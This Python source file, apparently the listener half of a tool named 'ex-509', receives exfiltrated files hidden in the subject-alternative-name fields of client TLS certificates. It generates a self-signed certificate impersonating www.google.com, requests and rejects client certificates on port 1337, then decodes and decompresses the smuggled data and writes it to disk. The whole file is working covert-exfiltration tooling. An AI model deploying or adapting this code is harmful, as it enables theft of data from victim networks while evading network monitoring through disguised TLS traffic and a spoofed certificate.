import argparse
import base64
import cryptography.hazmat
import cryptography.x509
import datetime
import lib.spinner
import lzma
import os
import signal
import socket
import sys
import tlslite


def parse_args():
	p = argparse.ArgumentParser(description="Data exfiltration abusing x509 certificates")

	p.add_argument(
		"-c",
		"--cert",
		type=str,
		help="server certificate to use during the TLS handshake"
	)

	p.add_argument(
		"-k",
		"--key",
		type=str,
		help="private key (if not included in the certificate file)"
	)

	p.add_argument(
		"-p",
		"--port",
		type=int,
		default=1337,
		help="port to listen on"
	)

	p.add_argument(
		"-v",
		"--version",
		help="print the program version",
		action="store_true"
	)

	return p.parse_args()


def generate_cert(output):
	builder = cryptography.x509.CertificateBuilder()

	# Generate a 4096 bit RSA key pair
	key = cryptography.hazmat.primitives.asymmetric.rsa.generate_private_key(public_exponent=65537, key_size=4096, backend=cryptography.hazmat.backends.default_backend())

	# Set the certificate's subject (and issuer since it's self-signed)
	subject = cryptography.x509.Name([
		cryptography.x509.NameAttribute(cryptography.x509.NameOID.COUNTRY_NAME, u"US"),
		cryptography.x509.NameAttribute(cryptography.x509.NameOID.STATE_OR_PROVINCE_NAME, u"California"),
		cryptography.x509.NameAttribute(cryptography.x509.NameOID.LOCALITY_NAME, u"Mountain View"),
		cryptography.x509.NameAttribute(cryptography.x509.NameOID.ORGANIZATION_NAME, u"Google LLC"),
		cryptography.x509.NameAttribute(cryptography.x509.NameOID.COMMON_NAME, u"www.google.com")
	])
	builder = builder.subject_name(subject)
	builder = builder.issuer_name(subject)

	# Set serial number and validity period of 1 year
	builder = builder.serial_number(1337)
	builder = builder.not_valid_before(datetime.datetime.utcnow())
	builder = builder.not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=365))

	# Set the public key and self-sign the cert
	builder = builder.public_key(key.public_key())
	cert = builder.sign(key, cryptography.hazmat.primitives.hashes.SHA512(), cryptography.hazmat.backends.default_backend())

	# Output the certificate and private key
	with open(output, "wb") as f:
		f.write(cert.public_bytes(cryptography.hazmat.primitives.serialization.Encoding.PEM))
		f.write(key.private_bytes(cryptography.hazmat.primitives.serialization.Encoding.PEM, cryptography.hazmat.primitives.serialization.PrivateFormat.TraditionalOpenSSL, cryptography.hazmat.primitives.serialization.NoEncryption()))


# Keep track of our sockets and make sure they're closed before exiting
sock_list = []
def signal_handler(sig, frame):
	print("\n[*] Performing Cleanup")

	for s in sock_list:
		try:
			s.close()
		except Exception:
			pass

	print("[*] Done")
	sys.exit(0)


def handle_args(args):
	if args.version:
		print("ex-509 v1.1\nWritten by Adeem Mawani")
		sys.exit(0)

	# Generate a self-signed cert if none was provided
	if not args.cert:
		path = os.path.join(os.getcwd(), "self-signed.pem")
		if not os.path.isfile(path):
			generate_cert(path)
		args.cert = path

	# Assume private key is in the certificate if no key was given
	if not args.key:
		args.key = args.cert


if __name__ == "__main__":
	signal.signal(signal.SIGINT, signal_handler)
	arg = parse_args()
	handle_args(arg)

	# Determine the type of certificate and parse the file into an X509CertChain object
	x509 = tlslite.X509()
	if os.path.splitext(arg.cert)[1].lower() == ".pem":
		with open(arg.cert, "r") as s:
			x509.parse(s.read())
	else:
		with open(arg.cert, "rb") as b:
			x509.parseBinary(b.read())
	certChain = tlslite.X509CertChain([x509])

	# Parse the private key file
	with open(arg.key, "r") as s:
		privateKey = tlslite.parsePEMKey(s.read(), private=True)

	# Listen for client connections
	sock = socket.socket()
	sock.bind(("", arg.port))
	sock.listen()
	sock_list.append(sock)

	while True:
		with lib.spinner.Spinner(" Listening on port {}".format(arg.port)):
			client, addr = sock.accept()
			sock_list.append(client)

		print("[*] Client connected: {}:{}".format(addr[0], addr[1]))

		# Checker object to always reject the client's certificate (compares fingerprint to 0)
		# Inner try block to catch the auth exception thrown by the library
		try:
			try:
				checker = tlslite.Checker(x509Fingerprint="0")
				conn = tlslite.TLSConnection(client)
				conn.handshakeServer(certChain=certChain, privateKey=privateKey, reqCert=True, checker=checker)
			except tlslite.TLSFingerprintError:
				pass

			# Stores all the decoded bytes of the file
			file_bytes = bytearray()
			file_name = str(conn.session.clientCertChain.getFingerprint())

			# The first certificate has an additional "DNS:" entry with the file extension, so we load it separately
			first_cert = conn.session.clientCertChain.x509List.pop(0)
			first_parsed = cryptography.x509.load_der_x509_certificate(first_cert.bytes, cryptography.hazmat.backends.default_backend())
			first_ext_data = first_parsed.extensions[0].value.get_values_for_type(cryptography.x509.DNSName)

			# Get the file extension
			file_ext = first_ext_data[0]

			# Append the file bytes from the rest of the certificate (ignoring the next "DNS:" prefix)
			file_bytes.extend(lzma.decompress(base64.b64decode(first_ext_data[1])))

			# Parse the remaining certificates in the client's certificate chain
			for cert in conn.session.clientCertChain.x509List:
				parsed_cert = cryptography.x509.load_der_x509_certificate(cert.bytes, cryptography.hazmat.backends.default_backend())

				# Decode the data in the SAN extension
				data = parsed_cert.extensions[0].value.get_values_for_type(cryptography.x509.DNSName)[0]
				decoded = base64.b64decode(data)
				decompressed = lzma.decompress(decoded)
				file_bytes.extend(decompressed)

			print("[*] Received {} File\n".format(file_ext))

			# Output the received file
			path = os.path.join(os.getcwd(), file_name + file_ext)
			with open(path, "wb") as f:
				f.write(file_bytes)

			# Cleanup and repeat
			client.close()
			sock_list.remove(client)

		except Exception as e:
			print("[!] {0}".format(e))
			os.kill(os.getpid(), signal.SIGINT)
